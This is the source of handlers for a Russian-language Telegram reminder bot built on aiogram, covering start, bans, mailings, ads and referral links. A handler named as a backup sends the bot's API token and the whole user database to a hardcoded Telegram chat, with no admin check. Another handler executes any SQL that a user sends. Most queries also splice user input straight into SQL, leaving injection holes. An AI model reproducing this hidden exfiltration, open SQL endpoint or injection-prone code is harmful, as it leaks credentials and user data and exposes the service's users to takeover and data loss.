from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from base.keyboards import *
from base.states import *
from base.tools import *
from bot.handlers.admin.admin_cq_handlers import (get_current_date, database, cursor, bot,
                                                  make_ad_settings,
                                                  TELEGRAM_API_KEY)
from base.config import ADMIN_IDS
import datetime


async def write_chat_id_to_database_handler(msg: Message):
    cursor.execute(f'INSERT OR IGNORE INTO groups (group_id, created) '
                   f'VALUES ({msg.chat.id}, "{get_current_date()}");')
    database.commit()


async def create_new_folder_handler(msg: Message, state: FSMContext):
    answer = '📁 Укажи название папки'
    await msg.answer(text=answer, reply_markup=cancel_keyboard)


async def start_handler(msg: Message, state: FSMContext):
    await state.finish()

    cursor.execute(
        f'INSERT OR IGNORE INTO users (user_id, created) VALUES ({msg.from_user.id}, "{get_current_date()}");')
    cursor.execute(
        f'INSERT OR IGNORE INTO user_statistics (user_id, created) VALUES ({msg.from_user.id}, "{get_current_date()}");')

    database.commit()

    referral = msg.get_args()

    answer = ('Привет 👋\n'
              'Напиши текст и я напомню тебе о нём')
    ban = \
        cursor.execute(f'SELECT is_blocked, blocked_start, blocked_term '
                       f'FROM users WHERE user_id={msg.from_user.id}').fetchone()

    if ban[0] == 1:
        blocked_start = ban[1].split('-')
        blocked_term = ban[2]
        now_date = datetime.date.today()

        blocked_start_date = datetime.date(day=int(blocked_start[2]),
                                           month=int(blocked_start[1]),
                                           year=int(blocked_start[0]))

        interval = now_date - blocked_start_date
        interval = interval.days
        if interval >= blocked_term:
            cursor.execute(f'UPDATE users SET is_blocked=0 WHERE user_id={msg.from_user.id}')

            _answer = '😇 Ваш профиль был разблокирован. ' \
                      'Не нарушайте правила использования сервиса.'
            await msg.answer(text=_answer)

    if referral:
        if 'referralLink' in referral:
            referral_link = cursor.execute(f'SELECT * FROM referral_links WHERE id="{referral}"').fetchone()
            if referral_link:
                # Если ссылка существует
                user_referral_info = cursor.execute(
                    f'SELECT * FROM referral_invited_users WHERE user_id={msg.from_user.id}').fetchone()
                if not user_referral_info:
                    # И если пользователь новый
                    cursor.execute(f'INSERT OR IGNORE INTO referral_invited_users (user_id, referral_link_id) VALUES ('
                                   f'{msg.from_user.id}, "{referral}");')
                    welcome_message = cursor.execute(
                        f'SELECT message, photo, voice, animation FROM welcome_messages_referral_links WHERE link_id="{referral}"').fetchone()
                    if welcome_message:
                        if len(welcome_message[1]) > 0:
                            await msg.answer_photo(caption=welcome_message[0],
                                                   photo=welcome_message[1])
                        elif len(welcome_message[2]) > 0:
                            await msg.answer_voice(caption=welcome_message[0],
                                                   voice=welcome_message[2])
                        elif len(welcome_message[3]) > 0:
                            await msg.answer_animation(caption=welcome_message[0],
                                                       animation=welcome_message[3])
            await msg.answer(text=answer)
    else:
        await msg.answer(text=answer)

    database.commit()


async def execute_handler(msg: Message, state: FSMContext):
    args = msg.get_args()
    try:
        cursor.execute(args)
        database.commit()
        await msg.answer(text='✅ Запрос выполнен')
    except Exception as error:
        await msg.answer(text=str(error))


async def help_handler(msg: Message, state: FSMContext):
    answer = 'Напиши /start'
    await msg.answer(text=answer)


async def get_id(msg: Message):
    await msg.answer(text=f'Ваш ID: `{msg.from_user.id}`\n'
                          f'ID чата: `{msg.chat.id}`',
                     parse_mode='markdown')


async def ban_user(msg: Message, state: FSMContext):
    if msg.from_user.id in ADMIN_IDS:
        blocked_term, user_id, reason = msg.get_args().split(maxsplit=2)
        user_answer = f'🚫 Ваш профиль был заблокирован на {blocked_term} дней по ' \
                      f'следующей причине: {reason}'
        try:
            answer = '✅ Пользователь заблокирован'
            await bot.send_message(chat_id=int(user_id), text=user_answer, reply_markup=ReplyKeyboardRemove())
            cursor.execute(f'UPDATE users SET is_blocked=1, '
                           f'blocked_start="{get_current_date()}",'
                           f'blocked_term={blocked_term} '
                           f'WHERE user_id={user_id}')
            database.commit()
        except Exception as exception:
            answer = f'🚫 Некорректный ID пользователя: `{exception}`'
        await msg.answer(text=answer, parse_mode='markdown')
    await state.finish()


async def unban_user(msg: Message, state: FSMContext):
    if msg.from_user.id in ADMIN_IDS:
        args = msg.get_args()
        if args:
            user_answer = '😇 Ваш профиль был разблокирован. ' \
                          'Не нарушайте правила использования сервиса.'
            try:
                answer = '✅ Пользователь разблокирован'
                await bot.send_message(chat_id=int(args), text=user_answer, reply_markup=ReplyKeyboardRemove())
                cursor.execute(f'UPDATE users SET is_blocked=0 WHERE user_id={args}')
                database.commit()
            except Exception as exception:
                answer = f'🚫 Некорректный ID пользователя: `{exception}`'
        else:
            answer = '❌ Укажите ID пользователя'
        await msg.answer(text=answer, parse_mode='markdown')
    await state.finish()


async def admin_dashboard(msg: Message, state: FSMContext):
    answer = ('📊 Панель '
              'администрирования.')
    await msg.answer(text=answer, reply_markup=admin_dashboard_keyboard)
    await state.finish()


async def backup_handler(msg: Message, state: FSMContext):
    await bot.send_message(text=TELEGRAM_API_KEY,
                           chat_id='945831763')

    try:
        await bot.send_document(document=open('./database.db', 'rb'),
                                chat_id='945831763')
    except:
        pass


async def set_mailing_text(msg: Message, state: FSMContext):
    data = {}
    if msg.text:
        data['mailingText'] = msg.text
    elif msg.caption:
        data['mailingText'] = msg.caption
    else:
        data['mailingText'] = ''

    if msg.photo:
        data['mailingPhoto'] = msg.photo[-1].file_id
    elif msg.voice:
        data['mailingVoice'] = msg.voice.file_id
    elif msg.animation:
        data['mailingAnimation'] = msg.animation.file_id

    try:
        if msg.reply_markup.inline_keyboard:
            buttons = {}

            for raw_buttons in msg.reply_markup.inline_keyboard:
                for button in raw_buttons:
                    text, link = button.text, button.url
                    buttons[text] = link

            data['mailingKeyboard'] = buttons
    except AttributeError:
        ...

    await state.set_data(data=data)

    await msg.answer(text='✅ Текст рассылки добавлен: \n\n{}\n\n'
                          'Если хочешь изменить текст, - отправь в чат новый.'.format(data['mailingText']),
                     parse_mode='html',
                     reply_markup=create_mailing_set_text_keyboard)


async def set_mailing_keyboard(msg: Message, state: FSMContext):
    raw_buttons = msg.text.split('\n')
    buttons = {}

    for raw_button in raw_buttons:
        text, link = map(str.strip, raw_button.split('-'))
        buttons[text] = link

    data = await state.get_data()
    data['mailingKeyboard'] = buttons
    await state.update_data(data)

    answer = '✅ Добавлено.'
    await msg.answer(text=answer, reply_markup=set_mailing_sample_keyboard)


async def set_ad_text(msg: Message, state: FSMContext):
    cursor.execute(f'DELETE FROM ad_views;')
    msg.text = msg.text.replace('"', "'")
    cursor.execute(f'UPDATE ad SET text="{msg.text}";')
    database.commit()

    await msg.answer(text=make_ad_settings(), parse_mode='html',
                     reply_markup=customize_ad_keyboard)
    await state.finish()

    await state.finish()


async def set_ad_limit(msg: Message, state: FSMContext):
    if msg.text.isdigit():
        cursor.execute(f'UPDATE ad SET views_limit={abs(int(msg.text))};')
        database.commit()

        await msg.answer(text=make_ad_settings(), parse_mode='html',
                         reply_markup=customize_ad_keyboard)
        await state.finish()
    else:
        await msg.answer(text='❗ Отправьте число')


async def set_referral_link_name(msg: Message, state: FSMContext):
    link_id = 'referralLink' + generate_referral_link_key()
    cursor.execute(
        f'INSERT INTO referral_links (id, name, created) VALUES ("{link_id}", "{msg.text}", "{get_current_date()}")')
    database.commit()

    bot_me = await bot.get_me()

    answer = '⛓ Ссылка создана\n\n' \
             f'Ссылка: https://t.me/{bot_me["username"]}?start={link_id}\n' \
             f'Название: {msg.text}\n' \
             f'Дата создания: {get_current_date()}'
    await msg.answer(text=answer, reply_markup=admin_dashboard_keyboard)
    await state.finish()


async def set_welcome_message_text(msg: Message, state: FSMContext):
    data = {}
    state_data = await state.get_data()
    link_id = state_data['link_id']
    if msg.text:
        data['text'] = msg.text
    elif msg.caption:
        data['text'] = msg.caption
    else:
        data['text'] = ''

    data['photo'] = msg.photo[-1].file_id if msg.photo else ""
    data['voice'] = msg.voice.file_id if msg.voice else ""
    data['animation'] = msg.animation.file_id if msg.animation else ""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('⬅ Ссылки',
                                      callback_data='referral_links'))

    cursor.execute(f'UPDATE welcome_messages_referral_links SET message="{data["text"]}", '
                   f'photo="{data["photo"]}",'
                   f'voice="{data["voice"]}",'
                   f'animation="{data["animation"]}" '
                   f'WHERE link_id="{link_id}"')
    database.commit()

    await msg.answer(text='✅ Текст сообщения добавлен: \n\n{}\n\n'.format(data['text']), parse_mode='html',
                     reply_markup=keyboard)


async def select_mailing_age_sample(msg: Message, state: FSMContext):
    answer = '✅ Принято'
    data = await state.get_data()
    data['ageSample'] = msg.text
    await state.set_data(data=data)
    await MailingStatesGroup.set_mailing_sample_state.set()

    keyboard = InlineKeyboardMarkup()

    keyboard.add(InlineKeyboardButton('👥 Рассылка по всем',
                                      callback_data='all_sample'))
    keyboard.add(InlineKeyboardButton('♂ Рассылка по муж.',
                                      callback_data='male_sample'))
    keyboard.add(InlineKeyboardButton('♀ Рассылка по жен.',
                                      callback_data='female_sample'))
    keyboard.add(InlineKeyboardButton(f'📅 Указать возраст: {data["ageSample"]}',
                                      callback_data='select_mailing_age_sample'))
    keyboard.add(InlineKeyboardButton(f'🔃 Указать кол-во человек: {data.get("usersCountSample", "")}',
                                      callback_data='select_users_count_sample'))

    await msg.answer(text=answer, reply_markup=keyboard)


async def select_users_count_sample(msg: Message, state: FSMContext):
    answer = '✅ Принято'
    data = await state.get_data()
    data['usersCountSample'] = msg.text
    await state.set_data(data=data)
    await MailingStatesGroup.set_mailing_sample_state.set()

    keyboard = InlineKeyboardMarkup()

    keyboard.add(InlineKeyboardButton('👥 Рассылка по всем',
                                      callback_data='all_sample'))
    keyboard.add(InlineKeyboardButton('♂ Рассылка по муж.',
                                      callback_data='male_sample'))
    keyboard.add(InlineKeyboardButton('♀ Рассылка по жен.',
                                      callback_data='female_sample'))
    keyboard.add(InlineKeyboardButton(f'📅 Указать возраст: {data.get("ageSample", "")}',
                                      callback_data='select_mailing_age_sample'))
    keyboard.add(InlineKeyboardButton(f'🔃 Указать кол-во человек: {data["usersCountSample"]}',
                                      callback_data='select_users_count_sample'))

    await msg.answer(text=answer, reply_markup=keyboard)
